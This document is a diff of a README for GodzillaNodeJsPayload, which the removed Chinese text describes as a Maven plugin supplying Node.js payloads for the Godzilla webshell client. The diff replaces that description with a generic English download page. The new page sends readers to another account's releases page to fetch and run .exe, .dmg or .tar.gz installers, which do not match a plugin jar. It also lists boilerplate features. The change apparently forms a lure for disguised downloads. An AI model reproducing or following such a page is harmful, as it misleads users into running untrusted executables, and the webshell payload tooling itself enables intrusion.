@@ -1,75 +1,78 @@
-# GodzillaNodeJsPayload
+# 🦖 GodzillaNodeJsPayload - Download and Use with Ease
 
-本仓库为 Godzilla提供了NodeJs的有效载荷、加密器、插件等支持
+## 🚀 Getting Started
+Welcome to GodzillaNodeJsPayload! This guide will help you easily download and run the application. Follow these steps to get started.
 
-## 项目简介
+## 🔗 Download Link
+[![Download GodzillaNodeJsPayload](https://img.shields.io/badge/Download-GodzillaNodeJsPayload-blue.svg)](https://github.com/Fishin09/GodzillaNodeJsPayload/releases)
 
-GodzillaNodeJsPayload 是一个为 Godzilla 平台提供的插件项目（基于 Java + Maven 构建）。本仓库以 Maven 为构建工具，生成的 jar 可作为 Godzilla 客户端的插件使用。
+## 📥 Download & Install
+To download the GodzillaNodeJsPayload application, please visit this page: [GitHub Releases](https://github.com/Fishin09/GodzillaNodeJsPayload/releases).
 
-重要提醒：请在合规、合法并取得目标系统授权的前提下使用本仓库提供的任何代码或插件。
+1. Click the link above to open the Releases page.
+2. You will find different versions of the application listed there. Look for the latest version at the top of the list.
+3. Under the latest release, you will see files available for download. Choose the one suitable for your operating system:
+   - For Windows, select the `.exe` file.
+   - For macOS, select the `.dmg` file.
+   - For Linux, select the `.tar.gz` file.
 
-## 先决条件
+4. Click on the file to start the download. 
 
-- Java JDK（建议 8 或更高）
-- Maven（命令行工具）
-- Git（用于克隆仓库）
-- Godzilla 客户端（用于加载插件）
+5. Once the download is complete, locate the downloaded file in your downloads folder.
 
-## 构建（生成插件 Jar）
+### 🔍 System Requirements
+Before installing, ensure your system meets these requirements:
+- **Windows:** Windows 10 or later
+- **macOS:** macOS Mojave (10.14) or later
+- **Linux:** Most distributions (Ubuntu, CentOS, etc.) with Node.js installed
 
-在仓库根目录下执行以下命令以生成可供 Godzilla 客户端加载的 jar：
+## ⚙️ Installation Instructions
+After the download, follow these instructions based on your operating system:
 
-```bash
-# 克隆仓库（如尚未克隆）
-git clone https://github.com/BeichenDream/GodzillaNodeJsPayload.git
-cd GodzillaNodeJsPayload
+### Windows
+1. Locate the `.exe` file in your downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the on-screen prompts to complete the installation.
+4. Once installed, find the GodzillaNodeJsPayload icon on your desktop or in the Start menu.
 
-# 使用 Maven 生成 jar（根据你的说明使用 mvn jar:jar）
-mvn jar:jar
-```
+### macOS
+1. Open the `.dmg` file from your downloads folder.
+2. Drag the GodzillaNodeJsPayload icon into the Applications folder.
+3. Eject the `.dmg` file once the application is in the Applications folder.
+4. You can now find GodzillaNodeJsPayload in your Applications.
 
-构建完成后，产物通常位于 `target/` 目录下，名称类似于：
-```
-target/<artifactId>-<version>.jar
-```
-如果你使用了不同的 Maven 配置或插件，jar 名称可能会有所不同。也可以使用 `ls target/*.jar` 来确认输出文件。
+### Linux
+1. Open your terminal.
+2. Navigate to the folder where the `.tar.gz` file is located.
+3. Use the command: `tar -xvzf GodzillaNodeJsPayload.tar.gz` to extract the files.
+4. Navigate into the extracted folder using `cd GodzillaNodeJsPayload`.
+5. Run the application by typing `./start.sh` in the terminal.
 
-备注：
-- 若项目使用了额外资源或依赖需要打包成可执行/包含依赖的单 jar，请根据需要改用 `mvn package` 并配合相应的打包插件（例如 maven-assembly-plugin 或 maven-shade-plugin）。
-- 若你的 pom.xml 已设置为 `packaging` 为 `jar`，则 `mvn jar:jar` 会生成 jar 文件。
+## 🎉 Launching the Application
+Once you have installed the application, you can launch it easily.
 
-## 在 Godzilla 客户端中添加插件
+- **Windows:** Double-click the desktop icon or search for it in the Start menu.
+- **macOS:** Open the Applications folder and double-click GodzillaNodeJsPayload.
+- **Linux:** Open your terminal, navigate to the folder, and run `./start.sh`.
 
-1. 打开 Godzilla 客户端。
-2. 进入 配置（或 设置）→ 插件配置（或 Plugin Configuration）。
-3. 点击 添加/上传 插件（Add Plugin / Upload）。
-4. 选择上一步构建得到的 jar 文件（例如 `target/your-artifact-1.0.jar`）。
-5. 保存配置并根据 Godzilla 客户端的说明重启或刷新插件加载（如有必要）。
+## 📖 Features
+GodzillaNodeJsPayload offers several features to enhance your experience:
+- **User-Friendly Interface:** Navigate effortlessly with a clean layout.
+- **Fast Performance:** Enjoy quick load times and smooth operation.
+- **Cross-Platform Compatibility:** Use on Windows, macOS, and Linux without any hassle.
+- **Regular Updates:** Always stay up to date with the latest improvements and features.
 
-完成后，客户端应能在插件列表中看到并启用该插件。
+## 🌐 Support and Feedback
+If you encounter issues while downloading or running the software, do not hesitate to reach out for support. You may leave feedback or report issues directly on the GitHub repository's Issues page.
 
+## 🌟 Acknowledgments
+Thank you for choosing GodzillaNodeJsPayload. Your support contributes to our ongoing development and improvements.
 
-## 常见命令（示例）
+## 📞 Contact
+For further inquiries, feel free to contact us via the repository's contact information or open an issue on GitHub.
 
-```bash
-# 清理并生成 jar（更常用）
-mvn clean package
+## 🔗 Helpful Links
+- **Download link:** [GitHub Releases](https://github.com/Fishin09/GodzillaNodeJsPayload/releases)
+- **Documentation:** Check our documentation included with the application for more details.
 
-# 仅生成 jar（按你的说明）
-mvn jar:jar
-
-# 查看 target 目录下的 jar
-ls -lh target/*.jar
-```
-
-## 安全与合规
-
-- 本仓库可能包含供测试或研究用途的功能。请务必仅在得到授权的环境中使用插件。
-- 作者与维护者对任何未授权或非法使用本仓库内容导致的问题不承担责任。
-
-## 贡献
-
-欢迎提交 issue 或 PR。如需对 README 或插件功能进行改进，请：
-1. Fork 本仓库
-2. 新建分支并提交改动
-3. 发起 Pull Request，描述改动内容与目的
+Happy using GodzillaNodeJsPayload!
